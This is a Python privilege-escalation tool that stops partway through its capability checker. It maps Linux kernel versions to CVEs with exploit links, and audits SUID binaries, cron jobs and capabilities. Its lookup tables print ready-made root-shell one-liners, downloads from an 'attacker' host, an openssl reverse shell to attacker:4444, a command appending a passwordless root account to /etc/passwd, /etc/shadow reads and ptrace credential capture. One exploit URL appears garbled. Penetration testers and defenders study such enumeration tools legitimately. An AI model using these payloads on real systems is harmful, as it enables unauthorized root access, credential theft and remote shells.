#!/usr/bin/env python3
"""
===============================================================================
  FU PERSON :: LINUX EXPLOITATION & PRIVILEGE ESCALATION MODULE v1.0
  Kernel CVE Mapping | SUID/SGID Analysis | Cron Abuse | Capability Audit
  Container Escape Detection | PATH Hijacking | Privilege Escalation Vectors
===============================================================================

  AUTHORIZATION REQUIRED - DO NOT USE WITHOUT WRITTEN PERMISSION

  LEGAL NOTICE:
  This tool is intended for AUTHORIZED penetration testing, red-team
  operations, and security research with explicit written consent.

  FLLC
  Government-Cleared Security Operations
===============================================================================
"""

import os, sys, re, json, stat, glob, argparse, subprocess
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Set

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


# =============================================================================
#  ANSI COLORS & DISPLAY
# =============================================================================

class C:
    R   = "\033[0m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"

    @staticmethod
    def p(text: str):
        try:
            print(text)
        except UnicodeEncodeError:
            print(re.sub(r"\033\[[0-9;]*m", "", str(text)))

    @staticmethod
    def ok(msg: str):   C.p(f"  {C.GRN}[+]{C.R} {msg}")
    @staticmethod
    def info(msg: str): C.p(f"  {C.BLU}[*]{C.R} {msg}")
    @staticmethod
    def warn(msg: str): C.p(f"  {C.YLW}[!]{C.R} {msg}")
    @staticmethod
    def fail(msg: str): C.p(f"  {C.RED}[-]{C.R} {msg}")

    @staticmethod
    def banner():
        C.p(f"""
{C.RED}{C.BLD}===============================================================================
  LINUX EXPLOITATION & PRIVILEGE ESCALATION MODULE v1.0
  Kernel CVE | SUID/SGID | Cron | Capabilities | Container | PATH Hijack
==============================================================================={C.R}
""")


# =============================================================================
#  DATA CLASSES
# =============================================================================

@dataclass
class KernelCVE:
    cve_id: str
    description: str
    affected_min: Tuple[int, ...]
    affected_max: Tuple[int, ...]
    cvss: float
    has_exploit: bool
    exploit_url: str = ""

    def affects(self, version: Tuple[int, ...]) -> bool:
        return self.affected_min <= version <= self.affected_max


@dataclass
class SUIDResult:
    path: str
    owner: str
    permissions: str
    is_suid: bool
    is_sgid: bool
    gtfobins: List[str] = field(default_factory=list)
    risk: str = "low"


@dataclass
class CronVuln:
    job_line: str
    vuln_type: str
    file_path: str
    description: str
    risk: str


@dataclass
class CapResult:
    binary: str
    caps: List[str]
    dangerous: bool
    suggestions: List[str] = field(default_factory=list)


@dataclass
class ContainerInfo:
    is_container: bool
    runtime: str
    privileged: bool
    escapes: List[str] = field(default_factory=list)


# =============================================================================
#  HELPERS
# =============================================================================

def _run(cmd: str, timeout: int = 10) -> str:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()
    except Exception:
        return ""


def _parse_version(ver_str: str) -> Tuple[int, ...]:
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", ver_str)
    if m:
        return (int(m.group(1)), int(m.group(2)), int(m.group(3)))
    m = re.match(r"(\d+)\.(\d+)", ver_str)
    if m:
        return (int(m.group(1)), int(m.group(2)), 0)
    return (0, 0, 0)


def _is_writable(path: str) -> bool:
    try:
        return os.access(path, os.W_OK)
    except Exception:
        return False


def _file_owner(path: str) -> str:
    try:
        import pwd
        st = os.stat(path)
        return pwd.getpwuid(st.st_uid).pw_name
    except Exception:
        return "unknown"


def _perm_string(mode: int) -> str:
    chars = ["r", "w", "x", "r", "w", "x", "r", "w", "x"]
    result = ""
    for i, c in enumerate(chars):
        bit = 8 - i
        result += c if mode & (1 << bit) else "-"
    if mode & stat.S_ISUID:
        result = result[:2] + ("s" if mode & stat.S_IXUSR else "S") + result[3:]
    if mode & stat.S_ISGID:
        result = result[:5] + ("s" if mode & stat.S_IXGRP else "S") + result[6:]
    if mode & stat.S_ISVTX:
        result = result[:8] + ("t" if mode & stat.S_IXOTH else "T")
    return result


# =============================================================================
#  KERNEL CVE MAPPER
# =============================================================================

class KernelCVEMapper:
    _DB: List[KernelCVE] = [
        KernelCVE("CVE-2016-5195", "DirtyCow - race condition in COW mechanism", (2,6,22), (4,8,2), 7.8, True, "https://github.com/dirtycow/dirtycow.github.io"),
        KernelCVE("CVE-2017-6074", "DCCP double-free privilege escalation", (2,6,14), (4,9,11), 7.8, True, ""),
        KernelCVE("CVE-2017-7308", "AF_PACKET privilege escalation via heap overflow", (3,2,0), (4,10,6), 7.8, True, ""),
        KernelCVE("CVE-2017-16995", "eBPF verifier arbitrary read/write", (4,4,0), (4,14,8), 7.8, True, ""),
        KernelCVE("CVE-2017-1000112", "UDP fragmentation offset UFO privilege escalation", (3,6,0), (4,12,3), 7.0, True, ""),
        KernelCVE("CVE-2017-1000253", "PIE stack corruption load_elf_binary", (2,6,25), (4,13,0), 7.8, True, ""),
        KernelCVE("CVE-2018-14634", "Integer overflow in create_elf_tables (Mutagen Astronomy)", (2,6,0), (4,17,0), 7.8, True, ""),
        KernelCVE("CVE-2018-18955", "User namespace nested userns privilege escalation", (4,15,0), (4,19,2), 7.0, True, ""),
        KernelCVE("CVE-2019-7304", "snapd socket API local privilege escalation (dirty_sock)", (2,6,0), (5,0,0), 8.8, True, "https://github.com/initstring/dirty_sock"),
        KernelCVE("CVE-2019-13272", "ptrace_link PTRACE_TRACEME privilege escalation", (4,10,0), (5,1,17), 7.8, True, ""),
        KernelCVE("CVE-2019-15666", "xfrm UAF via XFRM_UAF", (3,0,0), (5,2,3), 7.8, True, ""),
        KernelCVE("CVE-2020-8835", "eBPF verifier bounds tracking privilege escalation", (5,4,0), (5,5,13), 7.8, True, ""),
        KernelCVE("CVE-2020-14386", "AF_PACKET memory corruption privilege escalation", (4,6,0), (5,9,0), 7.8, True, ""),
        KernelCVE("CVE-2020-27194", "eBPF scalar32 bounds tracking", (5,8,0), (5,8,16), 7.8, True, ""),
        KernelCVE("CVE-2021-3156", "sudo heap-based buffer overflow (Baron Samedit)", (2,6,0), (5,99,0), 7.8, True, "https://github.com/blasty/CVE-2021-3156"),
        KernelCVE("CVE-2021-3493", "OverlayFS privilege escalation (Ubuntu)", (4,4,0), (5,11,0), 7.8, True, "https://github.com/briskets/CVE-2021-3493"),
        KernelCVE("CVE-2021-4034", "PwnKit - pkexec local privilege escalation", (2,6,0), (5,99,0), 7.8, True, "https://github.com/berdav/CVE-2021-4034"),
        KernelCVE("CVE-2021-22555", "Netfilter heap OOB write in xt_compat", (2,6,19), (5,12,0), 7.8, True, ""),
        KernelCVE("CVE-2021-31440", "eBPF verifier ALU32 bounds tracking", (5,7,0), (5,11,20), 7.0, True, ""),
        KernelCVE("CVE-2021-33909", "Sequoia - size_t to int conversion in filesystem layer", (3,16,0), (5,13,3), 7.8, True, "https://github.com/Liang2580/CVE-2021-33909"),
        KernelCVE("CVE-2021-41073", "io_uring type confusion privilege escalation", (5,10,0), (5,14,6), 7.8, True, ""),
        KernelCVE("CVE-2021-42008", "6pack driver heap overflow privilege escalation", (2,6,12), (5,14,12), 7.8, True, ""),
        KernelCVE("CVE-2021-43267", "TIPC message_push heap overflow", (5,10,0), (5,15,0), 9.8, True, ""),
        KernelCVE("CVE-2022-0185", "Integer underflow in legacy_parse_param (heap overflow)", (5,1,0), (5,16,2), 8.4, True, ""),
        KernelCVE("CVE-2022-0847", "DirtyPipe - splice pipe page cache corruption", (5,8,0), (5,16,11), 7.8, True, "https://github.com/AlexisAhworworworworworworwor/CVE-2022-0847-DirtyPipe-Exploits"),
        KernelCVE("CVE-2022-0995", "watch_queue filter OOB write", (5,8,0), (5,17,0), 7.8, True, ""),
        KernelCVE("CVE-2022-1015", "nftables OOB read/write in nft_validate_register_load", (5,12,0), (5,17,1), 6.6, True, ""),
        KernelCVE("CVE-2022-2588", "route4_change double-free in cls_route filter", (3,0,0), (5,19,0), 7.8, True, ""),
        KernelCVE("CVE-2022-2639", "openvswitch integer underflow leading to OOB read/write", (3,13,0), (5,18,0), 7.8, True, ""),
        KernelCVE("CVE-2022-25636", "Netfilter nf_tables_offload heap OOB", (5,4,0), (5,16,12), 7.8, True, ""),
        KernelCVE("CVE-2022-27666", "esp/esp6 heap buffer overflow", (2,6,0), (5,17,0), 7.8, True, ""),
        KernelCVE("CVE-2022-32250", "nf_tables UAF in set element handling", (3,13,0), (5,18,1), 7.8, True, ""),
        KernelCVE("CVE-2022-34918", "nft_set_elem_init heap buffer overflow", (5,8,0), (5,18,9), 7.8, True, ""),
        KernelCVE("CVE-2022-41218", "dvb-core UAF in dvb_demux", (2,6,12), (6,0,0), 7.8, True, ""),
        KernelCVE("CVE-2023-0179", "nftables stack buffer overflow via payload expression", (5,5,0), (6,2,0), 7.8, True, ""),
        KernelCVE("CVE-2023-0386", "OverlayFS capability bypass on file copy-up", (5,11,0), (6,2,0), 7.8, True, "https://github.com/sxlmnwb/CVE-2023-0386"),
        KernelCVE("CVE-2023-1829", "cls_tcindex UAF after tcindex_delete", (3,0,0), (6,2,0), 7.8, True, ""),
        KernelCVE("CVE-2023-2002", "Bluetooth hci_sock insufficient capability check", (3,0,0), (6,3,0), 6.5, True, ""),
        KernelCVE("CVE-2023-2598", "io_uring fixed buffer UAF leading to arbitrary write", (5,7,0), (6,3,0), 7.8, True, ""),
        KernelCVE("CVE-2023-2640", "GameOver(lay) - OverlayFS nosuid bypass (Ubuntu)", (5,15,0), (6,5,0), 7.8, True, "https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629"),
        KernelCVE("CVE-2023-3269", "StackRot - maple tree RCU race condition", (6,1,0), (6,4,1), 7.8, True, "https://github.com/lrh2000/StackRot"),
        KernelCVE("CVE-2023-3390", "nftables UAF in nft_chain_lookup_byid", (3,13,0), (6,3,0), 7.8, True, ""),
        KernelCVE("CVE-2023-4004", "nf_tables nft_pipapo set element UAF", (5,0,0), (6,4,0), 7.8, True, ""),
        KernelCVE("CVE-2023-4911", "Looney Tunables - glibc ld.so GLIBC_TUNABLES buffer overflow", (2,6,0), (6,99,0), 7.8, True, "https://github.com/leesh3288/CVE-2023-4911"),
        KernelCVE("CVE-2023-32233", "Netfilter nf_tables UAF in anonymous set handling", (5,0,0), (6,3,2), 7.8, True, "https://github.com/Liuk3r/CVE-2023-32233"),
        KernelCVE("CVE-2023-32629", "GameOver(lay) Ubuntu OverlayFS permission bypass", (5,15,0), (6,5,0), 7.8, True, ""),
        KernelCVE("CVE-2023-35001", "nf_tables OOB read/write via nft_byteorder", (3,13,0), (6,4,0), 7.8, True, ""),
        KernelCVE("CVE-2023-45871", "igb driver buffer overflow in IGB_MAX_FRAME_BUILD_SKB", (4,0,0), (6,5,3), 7.5, True, ""),
        KernelCVE("CVE-2024-0582", "io_uring registered buffer UAF via madvise", (6,4,0), (6,7,0), 7.8, True, ""),
        KernelCVE("CVE-2024-1086", "nf_tables nft_verdict_init double-free", (3,15,0), (6,8,0), 7.8, True, "https://github.com/Notselwyn/CVE-2024-1086"),
        KernelCVE("CVE-2024-4577", "PHP-CGI argument injection via Windows charset (cross-ref)", (2,6,0), (6,99,0), 9.8, False, ""),
        KernelCVE("CVE-2024-36971", "net/sched cls_route UAF in route4_change", (5,0,0), (6,9,0), 7.8, True, ""),
    ]

    @staticmethod
    def get_kernel_version() -> str:
        raw = _run("uname -r")
        return raw if raw else "0.0.0"

    @classmethod
    def check(cls, version_str: str) -> List[KernelCVE]:
        ver = _parse_version(version_str)
        return [cve for cve in cls._DB if cve.affects(ver)]

    @classmethod
    def run(cls) -> None:
        C.p(f"\n{C.CYN}{C.BLD}=== KERNEL CVE MAPPER ==={C.R}")
        kver = cls.get_kernel_version()
        C.info(f"Kernel version: {C.BLD}{kver}{C.R}")
        hits = cls.check(kver)
        if not hits:
            C.ok("No known CVEs matched this kernel version")
            return
        C.warn(f"Found {C.RED}{len(hits)}{C.R} potential CVEs:")
        for cve in sorted(hits, key=lambda c: c.cvss, reverse=True):
            exp = f"{C.RED}EXPLOIT AVAILABLE{C.R}" if cve.has_exploit else f"{C.DIM}no public exploit{C.R}"
            C.p(f"    {C.YLW}{cve.cve_id}{C.R}  CVSS {cve.cvss:.1f}  {exp}")
            C.p(f"      {C.DIM}{cve.description}{C.R}")
            if cve.exploit_url:
                C.p(f"      {C.CYN}{cve.exploit_url}{C.R}")


# =============================================================================
#  SUID / SGID FINDER
# =============================================================================

class SUIDFinder:
    GTFOBINS: Dict[str, List[str]] = {
        "bash": ["suid: bash -p", "sudo: sudo bash"],
        "sh": ["suid: sh -p"],
        "dash": ["suid: dash -p"],
        "zsh": ["suid: zsh"],
        "csh": ["suid: csh"],
        "ksh": ["suid: ksh -p"],
        "python": ["suid: python -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'", "sudo: sudo python -c 'import os;os.system(\"/bin/sh\")'"],
        "python3": ["suid: python3 -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'", "sudo: sudo python3 -c 'import os;os.system(\"/bin/sh\")'"],
        "python2": ["suid: python2 -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'"],
        "perl": ["suid: perl -e 'exec \"/bin/sh\";'", "sudo: sudo perl -e 'exec \"/bin/sh\";'"],
        "ruby": ["suid: ruby -e 'exec \"/bin/sh\"'", "sudo: sudo ruby -e 'exec \"/bin/sh\"'"],
        "node": ["suid: node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'"],
        "lua": ["suid: lua -e 'os.execute(\"/bin/sh\")'"],
        "php": ["suid: php -r 'pcntl_exec(\"/bin/sh\",[\"-p\"]);'", "sudo: CMD=\"/bin/sh\" sudo php -r 'system(\"$CMD\");'"],
        "vim": ["suid: vim -c ':!/bin/sh'", "file-read: vim /etc/shadow"],
        "vi": ["suid: vi -c ':!/bin/sh'"],
        "nano": ["file-write: nano /etc/passwd"],
        "ed": ["suid: ed then !/bin/sh"],
        "less": ["suid: less /etc/passwd then !/bin/sh", "file-read: less /etc/shadow"],
        "more": ["suid: more /etc/passwd then !/bin/sh"],
        "man": ["suid: man man then !/bin/sh"],
        "find": ["suid: find . -exec /bin/sh -p \\;", "sudo: sudo find . -exec /bin/sh \\;"],
        "awk": ["suid: awk 'BEGIN {system(\"/bin/sh\")}'", "sudo: sudo awk 'BEGIN {system(\"/bin/sh\")}'"],
        "gawk": ["suid: gawk 'BEGIN {system(\"/bin/sh\")}'"],
        "mawk": ["suid: mawk 'BEGIN {system(\"/bin/sh\")}'"],
        "nawk": ["suid: nawk 'BEGIN {system(\"/bin/sh\")}'"],
        "sed": ["suid: sed -n '1e exec sh -p 1>&0' /etc/hosts"],
        "nmap": ["suid: nmap --interactive then !sh (old versions)", "sudo: TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"],
        "zip": ["suid: TF=$(mktemp -u); zip $TF /etc/hosts -T -TT 'sh -p #'"],
        "tar": ["suid: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
        "gzip": ["file-read: gzip -f /etc/shadow -t"],
        "cp": ["file-write: cp /bin/sh /tmp/rootshell then run as SUID"],
        "mv": ["file-write: mv /etc/shadow /etc/shadow.bak"],
        "dd": ["file-write: echo 'root2::0:0::/root:/bin/sh' | dd of=/etc/passwd oflag=append conv=notrunc"],
        "env": ["suid: env /bin/sh -p", "sudo: sudo env /bin/sh"],
        "ftp": ["suid: ftp then !/bin/sh"],
        "gcc": ["suid: gcc -wrapper /bin/sh,-p,-s ."],
        "g++": ["suid: g++ -wrapper /bin/sh,-p,-s ."],
        "git": ["suid: git help config then !/bin/sh", "sudo: sudo git -p help config  -> !/bin/sh"],
        "wget": ["file-write: wget http://attacker/passwd -O /etc/passwd"],
        "curl": ["file-read: curl file:///etc/shadow", "file-write: curl http://attacker/shell -o /tmp/shell"],
        "ssh": ["suid: ssh -o ProxyCommand=';sh 0<&2 1>&2' x"],
        "scp": ["file-read: TF=$(mktemp); scp -S /bin/sh x:$TF $TF"],
        "make": ["suid: COMMAND='/bin/sh' make -s --eval=$'x:\\n\\t-$(COMMAND)'"],
        "docker": ["suid: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
        "strace": ["suid: strace -o /dev/null /bin/sh -p"],
        "ltrace": ["suid: ltrace -b -L /bin/sh -p"],
        "openssl": ["file-read: openssl enc -in /etc/shadow", "reverse-shell: openssl s_client -connect attacker:4444"],
        "tcpdump": ["suid: echo 'cp /bin/sh /tmp/sh && chmod +s /tmp/sh' > /tmp/.shell && chmod +x /tmp/.shell && tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.shell"],
        "busybox": ["suid: busybox sh"],
        "journalctl": ["suid: journalctl then !/bin/sh"],
        "systemctl": ["suid: systemctl then !sh (if pager is less)"],
        "screen": ["suid: screen (versions < 4.5.0 exploit)"],
        "tmux": ["suid: tmux"],
        "expect": ["suid: expect -c 'spawn sh -p;interact'"],
        "socat": ["suid: socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane"],
        "tclsh": ["suid: tclsh then exec /bin/sh <@stdin >@stdout 2>@stderr"],
        "wish": ["suid: wish then exec /bin/sh <@stdin >@stdout 2>@stderr"],
        "rlwrap": ["suid: rlwrap /bin/sh -p"],
        "xargs": ["suid: xargs -a /dev/null sh -p"],
        "nice": ["suid: nice /bin/sh -p"],
        "ionice": ["suid: ionice /bin/sh -p"],
        "taskset": ["suid: taskset 1 /bin/sh -p"],
        "time": ["suid: /usr/bin/time /bin/sh -p"],
        "timeout": ["suid: timeout 10 /bin/sh -p"],
        "stdbuf": ["suid: stdbuf -i0 /bin/sh -p"],
        "start-stop-daemon": ["suid: start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"],
        "run-parts": ["suid: run-parts --new-session --regex '^sh$' /bin --arg '-p'"],
        "pkexec": ["suid: pkexec /bin/sh (or CVE-2021-4034)"],
        "dmesg": ["file-read: dmesg (kernel messages may have credentials)"],
        "ip": ["suid: ip netns add foo; ip netns exec foo /bin/sh -p; ip netns delete foo"],
        "tee": ["file-write: echo 'root2::0:0::/root:/bin/sh' | tee -a /etc/passwd"],
        "base64": ["file-read: base64 /etc/shadow | base64 -d"],
        "xxd": ["file-read: xxd /etc/shadow | xxd -r"],
        "head": ["file-read: head -c1G /etc/shadow"],
        "tail": ["file-read: tail -c1G /etc/shadow"],
        "sort": ["file-read: sort -m /etc/shadow"],
        "uniq": ["file-read: uniq /etc/shadow"],
        "diff": ["file-read: diff --line-format=%L /dev/null /etc/shadow"],
        "cut": ["file-read: cut -d '' -f1 /etc/shadow"],
        "strings": ["file-read: strings /etc/shadow"],
        "fmt": ["file-read: fmt -pNON_EXISTENT /etc/shadow"],
        "nl": ["file-read: nl -bn -w1 -s '' /etc/shadow"],
        "wc": ["file-read: wc --files0-from=/etc/shadow"],
        "rev": ["file-read: rev /etc/shadow | rev"],
        "column": ["file-read: column /etc/shadow"],
        "pico": ["file-write: pico /etc/passwd"],
        "service": ["suid: service ../../bin/sh"],
        "mount": ["suid: sudo mount -o bind /bin/sh /bin/mount; mount"],
        "cpulimit": ["suid: cpulimit -l 100 -f /bin/sh -p"],
    }

    @staticmethod
    def _scan_bits(bit_flag: int) -> List[str]:
        results: List[str] = []
        search_dirs = ["/usr/bin", "/usr/sbin", "/bin", "/sbin",
                       "/usr/local/bin", "/usr/local/sbin", "/snap/bin"]
        for d in search_dirs:
            if not os.path.isdir(d):
                continue
            try:
                for entry in os.scandir(d):
                    if not entry.is_file(follow_symlinks=False):
                        continue
                    try:
                        mode = entry.stat().st_mode
                        if mode & bit_flag:
                            results.append(entry.path)
                    except (PermissionError, OSError):
                        continue
            except (PermissionError, OSError):
                continue
        return sorted(set(results))

    @classmethod
    def find_suid(cls) -> List[str]:
        return cls._scan_bits(stat.S_ISUID)

    @classmethod
    def find_sgid(cls) -> List[str]:
        return cls._scan_bits(stat.S_ISGID)

    @classmethod
    def check_gtfobins(cls, binary_path: str) -> List[str]:
        name = os.path.basename(binary_path)
        return cls.GTFOBINS.get(name, [])

    @classmethod
    def risk_assessment(cls, binary_path: str, techniques: List[str]) -> str:
        name = os.path.basename(binary_path)
        critical = {"bash", "sh", "dash", "zsh", "python", "python3", "perl",
                    "ruby", "docker", "env", "find", "pkexec"}
        high = {"vim", "vi", "less", "more", "awk", "nmap", "git", "ssh",
                "strace", "node", "lua", "php", "make", "socat", "expect",
                "screen", "tmux", "journalctl", "systemctl"}
        if name in critical or any("suid:" in t for t in techniques):
            return "CRITICAL"
        if name in high:
            return "HIGH"
        if techniques:
            return "MEDIUM"
        return "LOW"

    @classmethod
    def run(cls) -> None:
        C.p(f"\n{C.CYN}{C.BLD}=== SUID / SGID BINARY ANALYSIS ==={C.R}")
        suids = cls.find_suid()
        sgids = cls.find_sgid()
        C.info(f"Found {len(suids)} SUID and {len(sgids)} SGID binaries")
        findings: List[SUIDResult] = []
        for path in suids:
            techs = cls.check_gtfobins(path)
            risk = cls.risk_assessment(path, techs)
            mode = os.stat(path).st_mode
            findings.append(SUIDResult(path, _file_owner(path), _perm_string(mode), True, False, techs, risk))
        for path in sgids:
            if any(f.path == path for f in findings):
                continue
            techs = cls.check_gtfobins(path)
            risk = cls.risk_assessment(path, techs)
            mode = os.stat(path).st_mode
            findings.append(SUIDResult(path, _file_owner(path), _perm_string(mode), False, True, techs, risk))

        by_risk = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": []}
        for f in findings:
            by_risk[f.risk].append(f)
        color_map = {"CRITICAL": C.RED, "HIGH": C.YLW, "MEDIUM": C.BLU, "LOW": C.DIM}
        for level in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            items = by_risk[level]
            if not items:
                continue
            clr = color_map[level]
            C.p(f"\n  {clr}{C.BLD}[{level}]{C.R}  ({len(items)} binaries)")
            for f in items:
                typ = "SUID" if f.is_suid else "SGID"
                C.p(f"    {clr}{f.path}{C.R}  ({typ}  owner:{f.owner}  {f.permissions})")
                for t in f.gtfobins:
                    C.p(f"      {C.GRN}-> {t}{C.R}")


# =============================================================================
#  CRON ABUSE
# =============================================================================

class CronAbuse:
    WILDCARD_TOOLS = {"tar", "rsync", "chown", "chmod", "cp"}

    @classmethod
    def _read_file(cls, path: str) -> List[str]:
        try:
            with open(path, "r", errors="replace") as f:
                return [l.rstrip() for l in f if l.strip() and not l.strip().startswith("#")]
        except (PermissionError, FileNotFoundError, OSError):
            return []

    @classmethod
    def scan_crontabs(cls) -> List[Tuple[str, str]]:
        jobs: List[Tuple[str, str]] = []
        for path in ["/etc/crontab"]:
            for line in cls._read_file(path):
                jobs.append((path, line))
        for gp in ["/etc/cron.d/*", "/var/spool/cron/crontabs/*", "/var/spool/cron/*"]:
            for fp in glob.glob(gp):
                if os.path.isfile(fp):
                    for line in cls._read_file(fp):
                        jobs.append((fp, line))
        user_tab = _run("crontab -l 2>/dev/null")
        if user_tab:
            for line in user_tab.splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    jobs.append(("user-crontab", line))
        return jobs

    @classmethod
    def _extract_command(cls, line: str) -> str:
        parts = line.split()
        if len(parts) < 6:
            return line
        idx = 5
        if re.match(r"^[@*0-9/,-]", parts[0]):
            idx = 5
        else:
            idx = 6
        return " ".join(parts[idx:]) if len(parts) > idx else line

    @classmethod
    def find_writable_scripts(cls, jobs: List[Tuple[str, str]]) -> List[CronVuln]:
        vulns: List[CronVuln] = []
        for src, line in jobs:
            cmd = cls._extract_command(line)
            tokens = cmd.split()
            for token in tokens:
                if token.startswith("/") and os.path.isfile(token) and _is_writable(token):
                    vulns.append(CronVuln(line, "writable_script", token,
                        f"Cron-invoked script is writable: {token}", "CRITICAL"))
        return vulns

    @classmethod
    def find_wildcard_injection(cls, jobs: List[Tuple[str, str]]) -> List[CronVuln]:
        vulns: List[CronVuln] = []
        for src, line in jobs:
            cmd = cls._extract_command(line)
            for tool in cls.WILDCARD_TOOLS:
                if tool in cmd and "*" in cmd:
                    vulns.append(CronVuln(line, "wildcard_injection", src,
                        f"Wildcard used with {tool} - inject filenames as flags", "HIGH"))
        return vulns

    @classmethod
    def find_path_abuse(cls, jobs: List[Tuple[str, str]]) -> List[CronVuln]:
        vulns: List[CronVuln] = []
        for src, line in jobs:
            cmd = cls._extract_command(line)
            first = cmd.split()[0] if cmd.split() else ""
            if first and not first.startswith("/") and not first.startswith("$"):
                vulns.append(CronVuln(line, "relative_path", src,
                    f"Command '{first}' uses relative path - PATH hijack possible", "HIGH"))
        return vulns

    @classmethod
    def find_writable_dirs(cls, jobs: List[Tuple[str, str]]) -> List[CronVuln]:
        vulns: List[CronVuln] = []
        for src, line in jobs:
            cmd = cls._extract_command(line)
            tokens = cmd.split()
            for token in tokens:
                if token.startswith("/") and os.path.isfile(token):
                    parent = os.path.dirname(token)
                    if _is_writable(parent):
                        vulns.append(CronVuln(line, "writable_dir", parent,
                            f"Parent directory {parent} of cron script is writable", "HIGH"))
        return vulns

    @classmethod
    def run(cls) -> None:
        C.p(f"\n{C.CYN}{C.BLD}=== CRON JOB ABUSE ANALYSIS ==={C.R}")
        jobs = cls.scan_crontabs()
        C.info(f"Found {len(jobs)} cron job entries")
        all_vulns: List[CronVuln] = []
        all_vulns.extend(cls.find_writable_scripts(jobs))
        all_vulns.extend(cls.find_wildcard_injection(jobs))
        all_vulns.extend(cls.find_path_abuse(jobs))
        all_vulns.extend(cls.find_writable_dirs(jobs))
        if not all_vulns:
            C.ok("No exploitable cron configurations found")
            return
        C.warn(f"Found {C.RED}{len(all_vulns)}{C.R} cron vulnerabilities:")
        risk_clr = {"CRITICAL": C.RED, "HIGH": C.YLW, "MEDIUM": C.BLU, "LOW": C.DIM}
        for v in all_vulns:
            clr = risk_clr.get(v.risk, C.DIM)
            C.p(f"    {clr}[{v.risk}]{C.R} {v.vuln_type}")
            C.p(f"      {C.DIM}Job:  {v.job_line}{C.R}")
            C.p(f"      {C.DIM}Desc: {v.description}{C.R}")


# =============================================================================
#  CAPABILITY CHECKER
# =============================================================================

class CapabilityChecker:
    DANGEROUS: Dict[str, str] = {
        "cap_setuid":       "Change UID - escalate to root via setuid(0)",
        "cap_setgid":       "Change GID - escalate to root group",
        "cap_dac_override": "Bypass file read/write/execute permission checks",
        "cap_dac_read_search": "Bypass file read and directory search permissions",
        "cap_sys_admin":    "Wide range of admin ops - mount, swapon, quotactl",
        "cap_sys_ptrace":   "Trace/inject into any process - extract secrets, hijack execution",
        "cap_sys_module":   "Load kernel modules - arbitrary kernel code execution",
        "cap_net_raw":      "Use RAW/PACKET sockets - sniff traffic, craft packets",
        "cap_net_admin":    "Network admin ops - iptables, routing, interface config",
        "cap_net_bind_service": "Bind to ports < 1024",
        "cap_chown":        "Change file ownership - take ownership of any file",
        "cap_fowner":       "Bypass permission checks based on file owner",
        "cap_kill":         "Send signals to any process",
        "cap_sys_rawio":    "Direct I/O access to /dev/mem, /dev/port",
    }

    EXPLOITS: Dict[str, Dict[str, str]] = {
        "cap_setuid": {
            "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "perl":    "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
            "php":     "php -r 'posix_setuid(0); system(\"/bin/bash\");'",
            "node":    "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
            "ruby":    "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
            "gdb":     "gdb -q -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
        },
        "cap_dac_override": {
            "vim":     "vim /etc/shadow (read/modify protected files)",
            "python3": "python3 -c 'print(open(\"/etc/shadow\").read())'",
        },
        "cap_sys_ptrace": {
            "python3": "Inject shellcode into a root-owned process using ptrace",
            "gdb":     "gdb -p <root_pid> -ex 'call system(\"/bin/bash\")'",
            "strace":  "strace -p <pid> -e trace=read -s 9999 (credential capture)",
        },
        "cap_sys_admin": {
            "python3": "Mount host filesystem in container escape scenario",
        },
        "cap_net_raw": {
            "python3": "Craft raw packets / ARP spoofing / network sniffing",
            "tcpdump": "tcpdump -i any -w capture.pcap",
        },
    }

    @classmethod
    def find_caps(cls) -> List[Tuple[str, List[str]]]:
        results: List[Tuple[str, List[str]]] = []
        raw = _run("getcap -r /usr/bin /usr/sbin /bin /sbin /usr/local/bin 2>/dev/null")
        if not raw:
            raw = _run("find /usr /bin /sbin -type f -exec getcap {} + 2>/dev/null")
        for line in raw.splitlines():
            m = re.match(r"^(.+?)\s+(=|cap_)", line)
            if not m:
                continue
            path = line.split()[0].rstrip("=")
            caps = re.findall(r"cap_\w+", line.lower())
            if caps:
                results.append((path, caps))
        return results

    @classmethod
    def dangerous_caps(cls, caps: List[str]) -> List[Tuple[str, str]]:
        flagged: List[Tuple[str, str]] = []
        for cap in caps:
            cap_lower = cap.lower()
            if cap_lower in cls.DANGEROUS:
                flagged.append((cap_lower, cls.DANGEROUS[cap_lower]))
        return flagged

    @classmethod
    def exploit_suggestions(cls, binary: str, caps: List[str]) -> List[str]:
        suggestions: List[str] = []
        name = os.path.basename(binary)
        for cap in caps:
            cap_lower = cap.lower()
            if cap_lower in cls.EXPLOITS:
                if name in cls.EXPLOITS[cap_lower]:
                    suggestions.append(f"{cap_lower} via {name}: {cls.EXPLOITS[cap_lower][name]}")
        return suggestions

    @classmethod
    def run(cls) -> None:
        C.p(f"\n{C.CYN}{C.BLD}=== LINUX CAPABILITY ANALYSIS ==={C.R}")
        findings = cls.find_caps()
        if not findings:
            C.ok("No binaries with special capabilities found")
            return
